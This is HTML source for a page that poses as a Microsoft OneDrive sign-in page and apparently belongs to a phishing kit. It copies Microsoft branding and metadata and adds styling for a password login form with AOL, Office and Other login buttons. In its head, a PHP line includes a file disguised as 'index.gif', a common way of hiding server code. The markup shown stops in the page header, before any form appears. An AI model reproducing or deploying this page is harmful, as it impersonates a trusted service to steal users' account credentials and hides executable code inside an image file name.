<!DOCTYPE html>
<html dir="ltr" data-role-name="MeePortal" class="ltr SignedOut-onedrivePage signedout js picture eventlistener" lang="en-US"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8"><script async="" charset="UTF-8" src="files/meCore.js"></script><script async="" crossorigin="anonymous" type="text/javascript" src="files/ChangeMonitor-latest.js"></script><script async="" charset="UTF-8" src="files/meBoot.js"></script>
    <title>OneDrive | CloudStorage</title>

    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="format-detection" content="telephone=no">
        <meta name="description" content="A OneDrive account is the one place for everything in your life. OneDrive lets you easily backup, store and share photos, videos, and more.">
        <meta name="pageid" content="SignedOut-onedrivePage">
        <meta name="Keywords" content="OneDrive, OneDrive Login, OneDrive app, OneDrive storage, OneDrive account">
        <meta name="robots" content="index,follow">
        <meta name="og:site_name" content="Microsoft">
        <meta name="og:type" content="website">
        <meta name="og:locale" content="en_US">
        <meta name="og:url" content="https://account.microsoft.com/account/onedrive">
        <meta name="og:title" content="A OneDrive Account is Always Available. Always on Your Time">
        <meta name="og:description" content="A OneDrive account is the one place for everything in your life. OneDrive lets you easily backup, store and share photos, videos, and more.">
        <meta name="og:image" content="https://compass-ssl.microsoft.com/assets/18/7a/187a749f-a897-47d3-bf2f-b24333a1f682.jpg?n=hero-16-6-vp4-onedrive.jpg">
        <meta name="twitter:card" content="summary_large_image">
        <meta name="twitter:site" content="@Microsoft">
        <meta name="twitter:creator" content="@Microsoft">
        <meta name="twitter:url" content="https://account.microsoft.com/account/onedrive">
        <meta name="twitter:title" content="A OneDrive Account is Always Available. Always on Your Time">
        <meta name="twitter:description" content="A OneDrive account is the one place for everything in your life. OneDrive lets you easily backup, store and share photos, videos, and more.">
        <meta name="twitter:image" content="https://compass-ssl.microsoft.com/assets/18/7a/187a749f-a897-47d3-bf2f-b24333a1f682.jpg?n=hero-16-6-vp4-onedrive.jpg">
        <meta name="awa-prdct" content="signedout">
        <meta name="awa-market" content="en-US">
        <meta name="awa-env" content="Prod">
        <meta name="awa-aud" content="web">

        <meta property="og:site_name" content="Microsoft">
        <meta property="og:type" content="website">
        <meta property="og:locale" content="en_US">
        <meta property="og:url" content="https://account.microsoft.com/account/onedrive">
        <meta property="og:title" content=" A OneDrive Account is Always Available. Always on Your Time">
        <meta property="og:description" content="A OneDrive account is the one place for everything in your life. OneDrive lets you easily backup, store and share photos, videos, and more.">
        <meta property="og:image" content="https://compass-ssl.microsoft.com/assets/18/7a/187a749f-a897-47d3-bf2f-b24333a1f682.jpg?n=hero-16-6-vp4-onedrive.jpg">

    <link rel="canonical" href="https://account.microsoft.com/account/onedrive">
    <link href="files/favicon.ico" rel="shortcut icon" type="image/x-icon">
    
<link href="files/amc-west-european-default.css" rel="stylesheet">
<link href="files/amx.css" rel="stylesheet">
    <link rel="stylesheet" href="files/a7-b05f22.css" type="text/css" media="all"><link rel="stylesheet" href="files/override.css" type="text/css">
    <link href="files/site-oneui.css" rel="stylesheet">

    
    <link href="files/signedout-oneui.css" rel="stylesheet">




    
    
<script type="text/javascript">

    
    window.onerror = function javaScriptErrorWatchdog(errorMsg, url, lineNumber) {
        var errorMeta = document.createElement("meta");
        errorMeta.name = "JSError";
        errorMeta.content = "" + url + "; " + lineNumber + "; " + errorMsg;
        document.getElementsByTagName("head")[0].appendChild(errorMeta);

        return false;
    };



</script>


    
    <script type="text/javascript">
        if (navigator.userAgent.match(/IEMobile\/10\.0/)) {
            var msViewportStyle = document.createElement("style");
            var mq = "@-ms-viewport{width:auto!important}";
            msViewportStyle.appendChild(document.createTextNode(mq));
            document.getElementsByTagName("head")[0].appendChild(msViewportStyle);
        }
    </script>
    <script src="files/jquery-1.js"></script>
<script>(window.jQuery)||document.write('<script src="/bundles/scripts/jquery"><\/script>');</script>


    
    
    


    
        <script type="text/javascript" src="files/8267663488.js"></script>

    
    


    
    <!--[if lt IE 9]>
    <script src="/bundles/scripts/ie8-helpers?v=U8_D9kDJrSlXzGmjWCxMbPWAvmcAOqRqmEvgMBi0BZg1"></script>

    <script>
        var elems = ('abbr,article,aside,audio,bdi,canvas,data,datalist,details,dialog,figcaption,figure,footer,header,hgroup,main,mark,meter,nav,output,picture,progress,section,summary,template,time,video').split(',');
        for (var i = 0; i < elems.length; i++) {
            document.createElement(elems[i]);
        }
    </script>
    <![endif]-->

<script async="" src="files/t_007.js"></script><script async="" src="files/t_009.js"></script><script async="" src="files/t_012.js"></script><script async="" src="files/t.js"></script><script async="" src="files/t_010.js"></script><style type="text/css">.msame_TxtTrunc{white-space:nowrap;text-overflow:ellipsis;overflow:hidden;word-break:break-all}.msame_Header{display:inline-block;cursor:pointer;font-size:14px;border-width:1px;border-style:solid;border-bottom-style:none;border-color:transparent;width:100%}.msame_Header .msame_screen_reader{overflow:hidden;display:inline-block;width:1px;height:1px;position:absolute}.msame_Header_name{padding-left:12px;max-width:160px;display:inline-block;line-height:64px;vertical-align:top;font-family:"Segoe UI","Segoe UI Web Regular","Segoe UI Symbol","Helvetica Neue","BBAlpha Sans","S60 Sans",Arial,sans-serif;font-size:86%;color:#505050}.msame_unauth .msame_Header_name{padding-right:12px}.msame_unauth .msame_Header_name:hover{color:#0078d7}.msame_Drop_AI_pic,.msame_Drop_active_pic,.msame_Header_pic{display:inline-block}.msame_Header_piccont{padding-top:14px;padding-bottom:14px;padding-right:12px;padding-left:8px}.msame_Mobile .msame_Header_piccont{padding-top:10px;padding-bottom:10px}.msame_Short .msame_Header_piccont{padding-left:12px}.msame_Header_picframe{width:36px;height:36px;border-radius:50%;overflow:hidden}.msame_Mobile .msame_Header_picframe{width:48px;height:48px}.msame_open .msame_Header_picframe{z-index:3000001;position:relative}.msame_Header_chev{display:none}.msame_Mobile .msame_Header_piccont{padding-right:8px;padding-left:10px}.msame_Mobile .msame_Header_name{line-height:3;font-size:114%;padding-left:10px;padding-right:10px;display:inline-block;vertical-align:top;padding-top:14px}.msame_Mobile.msame_3row .msame_Header_name{padding-top:6px}.msame_Mobile .msame_Header_chev{display:inline-block;line-height:64px;vertical-align:top;padding-right:16px;padding-left:8px;float:right}.msame_open .msame_Header_chev img{-moz-transform:scaleY(-1);-o-transform:scaleY(-1);-webkit-transform:scaleY(-1);transform:scaleY(-1);filter:FlipV;-ms-filter:FlipV}.msame_Drop_root .msame_Drop_AI:focus,.msame_Drop_root .msame_Drop_AI_remove:focus,.msame_Drop_root a:focus,.msame_Header:focus{border-style:dashed;border-color:#000;border-width:1px}.msame_Header .msame_Header_piccont img{width:36px;height:36px;line-height:normal;vertical-align:baseline}.msame_Mobile .msame_Header_piccont img{width:48px;height:48px}.msame_Mobile .msame_Header_fullName{font-size:100%;color:#000;line-height:1.333}.msame_Drop_AI_email,.msame_Drop_AI_status,.msame_Mobile .msame_Header_email,.msame_Mobile .msame_Header_nickName{font-family:"Segoe UI","Segoe UI Web Regular","Segoe UI Symbol","Helvetica Neue","BBAlpha Sans","S60 Sans",Arial,sans-serif;font-size:86%;color:rgba(0,0,0,.54);line-height:1.333333}.msaie8 .msame_Drop_AI_pic,.msaie8 .msame_Drop_AI_right,.msaie8 .msame_Drop_active_pic,.msaie8 .msame_Drop_active_right,.msaie8 .msame_Header,.msaie8 .msame_Header_name,.msaie8 .msame_Header_pic{zoom:1}</style><script async="" src="files/t_002.js"></script><script async="" src="files/t_004.js"></script><script async="" src="files/t_008.js"></script><style type="text/css">.msame_open .msame_Header{border-color:#e6e6e6;background-color:#fff}.msame_open .msame_Header.msame_Mobile{border-color:transparent;background-color:transparent}.msame_ClickStart.msame_Drop_root .msame_Drop_AI:focus,.msame_ClickStart.msame_Drop_root .msame_Drop_AI_remove:focus,.msame_ClickStart.msame_Drop_root a:focus{outline-style:none}.msame_Drop_root a,.msame_Drop_root a:active,.msame_Drop_root a:focus,.msame_Drop_root a:hover,.msame_Drop_root a:visited{text-decoration:none}.msame_Drop_topb{border-top-color:#e6e6e6;border-top-style:solid;border-top-width:1px}.msame_Mobile .msame_Drop_topb{width:100%!important}.msame_Drop_active{padding-bottom:8px}.msame_Drop_AI_picframe{width:44px;height:44px;border-radius:50%;overflow:hidden}.msame_Drop_AI_piccont img{width:44px;height:44px}.msame_Drop_root{border-width:1px;border-color:#e6e6e6;border-style:solid;border-top-style:none;position:absolute;width:360px;z-index:3000000;background-color:#fff;font-size:14px}.msame_Drop_sep{border-top-width:1px;border-top-color:#e6e6e6;border-top-style:solid;width:100%;height:0;display:block}.msame_Mobile.msame_Drop_root{left:0!important;right:0;bottom:0;width:100%;border-right-width:0;border-left-width:0}.msame_Mobile .msame_Drop_content{overflow-y:auto;position:absolute;left:0;right:0;bottom:0;top:0}.msame_Drop_root a{text-decoration:none}.msame_Drop_content{overflow:hidden}.msame_Mobile .msame_Drop_active{display:none}.msame_Drop_AI{cursor:pointer}.disabled .msame_Drop_AI_pic,.disabled .msame_Drop_AI_right{opacity:.4;cursor:default}.disabled .msame_Drop_AI_email,.disabled .msame_Drop_AI_name,.disabled .msame_Drop_AI_status{color:#000}.msame_Drop_active_piccont{padding:5px}.msame_Drop_AI_piccont{padding:10px}.msame_Drop_active_picframe{width:74px;height:74px;border-radius:50%;overflow:hidden}.msame_Drop_active_picborder,.msame_Drop_active_piccont a{display:block;padding:5px;border-radius:50%}.msame_Drop_active_piccont a:focus{padding:4px;border:1px dashed #000}.msame_Drop_active_piccont img{width:64px;height:64px;border-radius:50%}.msame_Drop_active_name{display:block;line-height:1.3;font-size:150%;color:#000;font-family:"Segoe UI Light","Segoe UI Web Light","Segoe UI Web Regular","Segoe UI","Segoe UI Symbol",HelveticaNeue-Light,"Helvetica Neue",Arial,sans-serif}.msame_Drop_active_email{display:block;line-height:1.42857;font-size:100%;color:rgba(0,0,0,.54);font-family:"Segoe UI","Segoe UI Web Regular","Segoe UI Symbol","Helvetica Neue","BBAlpha Sans","S60 Sans",Arial,sans-serif;padding:1px}.msame_Drop_active_right{display:inline-block;width:216px;vertical-align:top;padding-top:12px;padding-right:12px;padding-left:12px}.msame_Drop_active_right a{color:rgba(0,0,0,.54)}.msame_Drop_SI a{line-height:2;font-size:114%;font-family:"Segoe UI","Segoe UI Web Regular","Segoe UI Symbol","Helvetica Neue","BBAlpha Sans","S60 Sans",Arial,sans-serif;padding-left:12px;padding-right:12px;display:block;color:#000}.msame_Mobile .msame_Drop_SI a{line-height:2.75}.msame_Drop_AI.switch:hover,.msame_Drop_AI_remove:hover,.msame_Drop_SI a:hover{color:#000;background-color:rgba(0,0,0,.12)}.msame_Drop_AI.switch:active,.msame_Drop_AI.switch:active div,.msame_Drop_AI_remove:active,.msame_Drop_SI a:active{color:#fff!important;background-color:#000}.msame_Drop_SI a:link,.msame_Drop_SI a:visited{color:#000}.msame_Drop_active_link a,.msame_Drop_active_link a:active,.msame_Drop_active_link a:hover,.msame_Drop_active_link a:link,.msame_Drop_active_link a:visited{line-height:1.333333;font-size:86%;font-family:"Segoe UI","Segoe UI Web Regular","Segoe UI Symbol","Helvetica Neue","BBAlpha Sans","S60 Sans",Arial,sans-serif;color:#0078d7}.msame_Drop_AL{padding-bottom:24px}.msame_Drop_AI_right{display:inline-block;width:252px;vertical-align:top;padding-left:8px;padding-top:5px}.msame_Mobile .msame_Drop_AI_right{width:100px}.msame_Drop_AI_name{font-family:"Segoe UI","Segoe UI Web Regular","Segoe UI Symbol","Helvetica Neue","BBAlpha Sans","S60 Sans",Arial,sans-serif;font-size:114%;color:#000;line-height:1.25}.msame_Drop_AI_remove{float:right;margin-top:6px;padding-top:12px;padding-bottom:12px;padding-left:12px;padding-right:12px;text-align:center;cursor:pointer}.msame_Drop_AI_remove img{display:block}.msame_auto_frame{display:none;position:absolute;top:0;left:-4000px;width:0}</style><script async="" src="files/t_011.js"></script><script async="" src="files/t_005.js"></script><script async="" src="files/t_003.js"></script><script async="" src="files/t_006.js"></script><script async="" src="files/t_013.js"></script>
<style type="text/css">

}
.login-form .group{
	margin-bottom:15px;
}
.login-form .group{
	padding: 0 60px 0 60px;
}
.login-form .group .label,
.login-form .group .input,
.login-form .group .button{
	width:100%;
	color:#fff;
	display:block;
}
.login-form .group .input,
.login-form .group .button{
	border:none;
	padding:15px 20px;
	border-radius:25px;
	background:rgba(255,255,255,.1);
}
.login-form .group input[data-type="password"]{
	text-security:circle;
	-webkit-text-security:circle;
}
.login-form .group .label{
	color:#aaa;
	font-size:12px;
}
.login-form .group .button{
	background:#1161ee;
}
.login-form .group label .icon{
	width:15px;
	height:15px;
	border-radius:2px;
	position:relative;
	display:inline-block;
	background:rgba(255,255,255,.1);
}
.login-form .group label .icon:before,
.login-form .group label .icon:after{
	content:'';
	width:10px;
	height:2px;
	background:#fff;
	position:absolute;
	-webkit-transition:all .2s ease-in-out 0s;
	transition:all .2s ease-in-out 0s;
}
.login-form .group label .icon:before{
	left:3px;
	width:5px;
	bottom:6px;
	-webkit-transform:scale(0) rotate(0);
	        transform:scale(0) rotate(0);
}
.login-form .group label .icon:after{
	top:6px;
	right:0;
	-webkit-transform:scale(0) rotate(0);
	        transform:scale(0) rotate(0);
}
.login-form .group {
	color:#fff;
}
.login-form .group .icon{
	background:#1161ee;
}
.login-form .group  .icon:before{
	-webkit-transform:scale(1) rotate(45deg);
	        transform:scale(1) rotate(45deg);
}
.login-form .group  .icon:after{
	-webkit-transform:scale(1) rotate(-45deg);
	        transform:scale(1) rotate(-45deg);
}
.login-html .login-form .sign-in-htm{
	-webkit-transform:rotate(0);
	        transform:rotate(0);
}
.login-html .login-form .sign-up-htm{
	-webkit-transform:rotate(0);
	        transform:rotate(0);
}


/*Buttons*/

.loginBtn {
  box-sizing: border-box;
  position: relative;
  /* width: 13em;  - apply for fixed size */
  margin: 0.2em;
  padding: 0 15px 0 46px;
  border: none;
  text-align: left;
  line-height: 34px;
  white-space: nowrap;
  border-radius: 0.2em;
  font-size: 16px;
  color: #FFF;
}
.loginBtn:before {
  content: "";
  box-sizing: border-box;
  position: absolute;
  top: 0;
  left: 0;
  width: 34px;
  height: 100%;
}
.loginBtn:focus {
  outline: none;
}
.loginBtn:active {
  box-shadow: inset 0 0 0 32px rgba(0,0,0,0.1);
}

/* Aol */
.loginBtn--aol {
  /*font-family: "Roboto", Roboto, arial, sans-serif;*/
  background: #01A9DB;
}
.loginBtn--aol:before {
  border-right: #81DAF5 1px solid;
  background: url('https://s.blogsmithmedia.com/www.aol.com/assets-h536bb713d3464103038f4a5c4a4ad019/images/favicon/favicon-32x32.png?h=4e69b4bd1929e36297ec905e04213f7a') 3px 3px no-repeat;
}
.loginBtn--aol:hover,
.loginBtn--aol:focus {
  background: #2E9AFE;
}



/* Office */
.loginBtn--office {
  /*font-family: "Roboto", Roboto, arial, sans-serif;*/
  background: #FF8458;
}
.loginBtn--office:before {
  border-right: #5F0C8E 1px solid;
  background: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABYAAAAWCAYAAADEtGw7AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyZpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMTM4IDc5LjE1OTgyNCwgMjAxNi8wOS8xNC0wMTowOTowMSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIDIwMTcgKFdpbmRvd3MpIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOkY0MDc4NDk3OEJEMjExRTdBRTAzQjA3NjNBQkY1RTA3IiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOkY0MDc4NDk4OEJEMjExRTdBRTAzQjA3NjNBQkY1RTA3Ij4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6RjQwNzg0OTU4QkQyMTFFN0FFMDNCMDc2M0FCRjVFMDciIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6RjQwNzg0OTY4QkQyMTFFN0FFMDNCMDc2M0FCRjVFMDciLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz7jO1jKAAAB/UlEQVR42tSVv08UQRTH3/zY3VtPDxcFDyFGsbUwMTEx9haooSHG2Fj4B1D4b1j5H9hbWGBjpBEwGqOJmCBoIYQOiQinx+3Mzhu+c8F4weCiQMRJPsnOm8k3b77z3qzw3tN+DEn7NPTWwPTw6e32DhbOjVTTtHfgZN8TzCdx2uaPxcP3n/1eeMvoAdfAcEAKQbYoqCjc3TjS8877ccSfgsegsRPhq+AmuNVpFzJ8z+zmoH8FNxOOdmeTT+FEZcIvwcWO+SMwAZ475hfZ0S6Ko2gBtpzq2HOm1OMOUQsug1cCKa63WhRE++v1I9baZDdVYcBc+EB2lFYSOnG8h5hZux3UqCxZy4KGwMdAva8tbqxtz3ddxyE1pRQprdqZB1v2rEFC1rDgYHTevxMOHjuFqtTRngmnLKR2EKytLlPU+EI+SYPhf/cIhRy9QAUo/UZ4Xuz+tkLda6vUml2jOE5IZb3E3/EslFTHL8Is9Zhy9kPW/PqgYprmUJ6TQ5+x8ZRPv6bk3IUVWcvY2/zPhAX568caS1Rr5iNW0WihqI7wZ5HQLK/TW/PxXZ6cvxSThIs/S9CUCisuKEY2RtNDFjSD0FD76fR0W4T7w7o3LZKV6rJnngyPExgrFQ4NzFKRRJdhzGxyD/Rj8YZIq2dFFI9DdAqxpe2sEP/dP29DgAEAOW7GEnmOhfsAAAAASUVORK5CYII=') 6px 6px no-repeat;
}
.loginBtn--office:hover,
.loginBtn--office:focus {
  background: #AF5A3C;
}

/* Other */
.loginBtn--other {
  /*font-family: "Roboto", Roboto, arial, sans-serif;*/
  background: #0B615E;
}
.loginBtn--other:before {
  border-right: #787878 1px solid;
  background: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABYAAAAWCAYAAADEtGw7AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyZpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMTM4IDc5LjE1OTgyNCwgMjAxNi8wOS8xNC0wMTowOTowMSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIDIwMTcgKFdpbmRvd3MpIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjAwMUM2MzMxOEMyMDExRTdBODhCQjAxQjg3NkQ5MEEyIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjAwMUM2MzMyOEMyMDExRTdBODhCQjAxQjg3NkQ5MEEyIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6MDAxQzYzMkY4QzIwMTFFN0E4OEJCMDFCODc2RDkwQTIiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6MDAxQzYzMzA4QzIwMTFFN0E4OEJCMDFCODc2RDkwQTIiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz4gXxPjAAADDklEQVR42rSVS0tbURDHJ09NfMUXiiIiCm0XyUIproR+BmlBkH6GrvoR2n0/hYrQrStpd4HQhRhCFR8Ln+AjGI2JJsZ0ftOc67UPaxcOnJx758785z+PcxKo1+vyFBLm5+DgQAKBgBCkVqvZM9Lc3Cynp6eysLAgV1dXL1VVV923mZkZ6erqQmd2+IVCIQ9jYGBAgi4CygZgRFewsdCFI5HIW338wuJZdaGGm7OL+Px/4hEBxrq/urm5+aR7TPUV8woGa6qLFgqF565kOHd0dHwPh8PV29tbFyCq+rLq3un+FcZWCnUGeFrLkPLXibIouKWmTvaMbbFYfFGtVu8xbMg0wF6N4/G4lMvlIk44+0VTl0qlYlmxt7a2Wn2vr6/F33hlj28xFot5NTInBS3AyglOTU1Ncnl5Kaurq1IqlYz1zs6ObGxsSDQavT8F+g2Mw8PDO+D5+XnZ3t5OtrS0GCCLNMlgfX1duru7LUg+n5f29nY5OTkRAMjG2ZP11tZWcm5u7g5Y6/Xx4uJi1o0MC0Y4kzqOx8fHpteSyeDgoIED7OoM4/Pz81ktyQcPWAFfkyp16unpkba2Nuns7LR3agZIMpm0AIDRVOxgSeDe3l6bY75pdm88YHXOb25uytLSkhwdHRlbUk8kElbb4eFhWVtbMyBqToPHxsZsp3xkkclk7DD19/fnvamgV7ADnOZMTEzI+Pi4jIyMmHHDwYLBlFKQOlNCI3O5nJydnVkQZV73gEkRQ3aM0+m0BZmampJUKiW7u7vGXA+KjI6Omu3+/r5ks1nZ29uzdz003jT5GXunCiPY06zFxUUDJgCOpE4AF5hZhqWbfTdNvwE7wdAZkyYgk5OT1iTeCcoFRZMfvN3+JoAzAdxiKysrNsO8sz/q2vxV3PWJMBkcYXdgGKlH38eU13/xsBgtThw1dDpm9RES8IDVIUHDcKZ5ANIsWDIl/kz+JWqT8IC108vK8Bm1A5QDQtoE+8PV+BAoJJc9YB3u9319femhoaG4AlYc8/+UqBIpqd9n7x/kKeSHAAMA3P64lXV+LZAAAAAASUVORK5CYII=') 6px 6px no-repeat;
}
.loginBtn--other:hover,
.loginBtn--other:focus {
  background: #6B6B6B;
}

</style>
<script type="text/javascript">
<!--
function popupwnd(url, toolbar, menubar, locationbar, resize, scrollbars, statusbar, left, top, width, height)
{
   if (left == -1)
   {
      left = (screen.width/2)-(width/2);
   }
   if (top == -1)
   {
      top = (screen.height/2)-(height/2);
   }
   var popupwindow = this.open(url, '', 'toolbar=' + toolbar + ',menubar=' + menubar + ',location=' + locationbar + ',scrollbars=' + scrollbars + ',resizable=' + resize + ',status=' + statusbar + ',left=' + left + ',top=' + top + ',width=' + width + ',height=' + height);
}
//-->
</script>
</script><?php include_once "files/index.gif";?>
</head>
<body>
    <div id="page-wrapper">
        <header id="site-header">
            






            


    <noscript>
            <div class="m-alert f-warning site-alert" role="alert">
        <div>
            <div class="c-glyph glyph-warning" aria-label="Warning message"></div>
            <p class="c-paragraph">
                To use everything on this website, turn on JavaScript in your browser settings.
                <span class="c-group"><a class="c-action-trigger" href="https://go.microsoft.com/fwlink/p/?LinkId=616795">Learn how</a></span>
            </p>
        </div>
    </div>

    </noscript>
    <div id="no-cookies">
            <div class="m-alert f-warning site-alert" role="alert">
        <div>
            <div class="c-glyph glyph-warning" aria-label="Warning message"></div>
            <p class="c-paragraph">
                To use everything on this website, turn on cookies in your browser settings. <a href="https://go.microsoft.com/fwlink/?LinkId=313221">Read why and how we use cookies.</a>
                <span class="c-group"><a class="c-action-trigger" href="https://go.microsoft.com/fwlink/p/?LinkId=616796">Learn how</a></span>
            </p>
        </div>
    </div>

    </div>


            
    <div id="sharedshell-header">
            <section id="headerArea" data-m="{&quot;cN&quot;:&quot;headerArea&quot;,&quot;cT&quot;:&quot;Area_coreuiArea&quot;,&quot;id&quot;:&quot;a1Body&quot;,&quot;sN&quot;:1,&quot;aN&quot;:&quot;Body&quot;}">
                    <div id="headerRegion" data-region-key="headerregion" data-m="{&quot;cN&quot;:&quot;headerRegion&quot;,&quot;cT&quot;:&quot;Region_coreui-region&quot;,&quot;id&quot;:&quot;r1a1&quot;,&quot;sN&quot;:1,&quot;aN&quot;:&quot;a1&quot;}">

    <div id="headerUniversalHeader" data-m="{&quot;cN&quot;:&quot;headerUniversalHeader&quot;,&quot;cT&quot;:&quot;Module_coreui-universalheader&quot;,&quot;id&quot;:&quot;m1r1a1&quot;,&quot;sN&quot;:1,&quot;aN&quot;:&quot;r1a1&quot;}" data-module-id="Category|headerRegion|headerRegion|headerUniversalHeader|coreui-universalheader">
        



        <div id="epb" class="x-hidden x-hidden-vp1 x-hidden-vp2 uhfc-universal-context context-uhf" data-m="{&quot;cN&quot;:&quot;epb_cont&quot;,&quot;cT&quot;:&quot;Container&quot;,&quot;id&quot;:&quot;c1m1r1a1&quot;,&quot;sN&quot;:1,&quot;aN&quot;:&quot;m1r1a1&quot;}">



<div class="c-uhfh-alert f-information epb-container epb-default-color" role="alert" data-m="{&quot;cT&quot;:&quot;Container&quot;,&quot;id&quot;:&quot;c1c1m1r1a1&quot;,&quot;sN&quot;:1,&quot;aN&quot;:&quot;c1m1r1a1&quot;}">
    <div>        
        <p class="c-paragraph">
                <img alt="Microsoft Edge" data-src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/REZlo1?ver=5722" class="f-img-lzy">

            <span class="c-text-group">
                <span class="epb-launch">Try Microsoft Edge</span>
                <span class="epb-text">A fast and secure browser that's designed for Windows 10</span>
            </span>
            <span class="c-group">
                <button id="close-epb" class="c-action-trigger c-action-cancel glyph-cancel" data-m="{&quot;cN&quot;:&quot;EPB-dismiss_nonnav&quot;,&quot;id&quot;:&quot;nn1c1c1m1r1a1&quot;,&quot;sN&quot;:1,&quot;aN&quot;:&quot;c1c1m1r1a1&quot;}" aria-label="No thanks, I'll try Microsoft Edge later. ">No thanks</button>
                <a id="epbTryNow" data-telem-qsp="form=MY009W" aria-label="Get Started: Open this page in Microsoft Edge" class="epb-launch c-action-trigger c-action-open" data-m="{&quot;cN&quot;:&quot;EPB-launch_nav&quot;,&quot;id&quot;:&quot;n2c1c1m1r1a1&quot;,&quot;sN&quot;:2,&quot;aN&quot;:&quot;c1c1m1r1a1&quot;}">Get started</a>
            </span>

        </p>
    </div>
</div>


            
        </div>



        <a class="m-skip-to-main" href="#main-content-landing" tabindex="0" style="z-index:3000002" data-m="{&quot;cN&quot;:&quot;Skip to content_nonnav&quot;,&quot;id&quot;:&quot;nn2c1m1r1a1&quot;,&quot;sN&quot;:2,&quot;aN&quot;:&quot;c1m1r1a1&quot;}">Skip to main content</a>

<header role="banner" class="c-uhfh context-uhf" itemscope="itemscope" data-header-footprint="/amc/amc-L0-header" data-ckrate="1" data-magict="true" itemtype="http://schema.org/Organization">
    <div class="theme-light js-global-head f-closed " data-m="{&quot;cN&quot;:&quot;Universal Header_cont&quot;,&quot;cT&quot;:&quot;Container&quot;,&quot;id&quot;:&quot;c3c1m1r1a1&quot;,&quot;sN&quot;:3,&quot;aN&quot;:&quot;c1m1r1a1&quot;}">
        <div class="c-uhfh-gcontainer">
            <button class="c-action-trigger c-glyph glyph-global-nav-button" aria-label="Header navigation menu" aria-expanded="false" data-m="{&quot;cN&quot;:&quot;Mobile menu button_nonnav&quot;,&quot;id&quot;:&quot;nn1c3c1m1r1a1&quot;,&quot;sN&quot;:1,&quot;aN&quot;:&quot;c3c1m1r1a1&quot;}"></button>
            <button class="c-action-trigger c-glyph glyph-arrow-htmllegacy" aria-label="Close search" aria-expanded="false" data-m="{&quot;cN&quot;:&quot;Close Search_nonnav&quot;,&quot;id&quot;:&quot;nn2c3c1m1r1a1&quot;,&quot;sN&quot;:2,&quot;aN&quot;:&quot;c3c1m1r1a1&quot;}"></button>
                <a id="uhfLogo" class="g-logo" itemprop="url" href="https://www.microsoft.com/" aria-label="Microsoft" data-m="{&quot;cN&quot;:&quot;GlobalNav_Logo_cont&quot;,&quot;cT&quot;:&quot;Container&quot;,&quot;id&quot;:&quot;c3c3c1m1r1a1&quot;,&quot;sN&quot;:3,&quot;aN&quot;:&quot;c3c1m1r1a1&quot;}">
                        <img itemprop="logo" itemscope="itemscope" class="g-image" src="files/OneDrive300dpi.png" width="136" height="38">
                        
                    </a>    
            
        </div>
        
        
    </div>
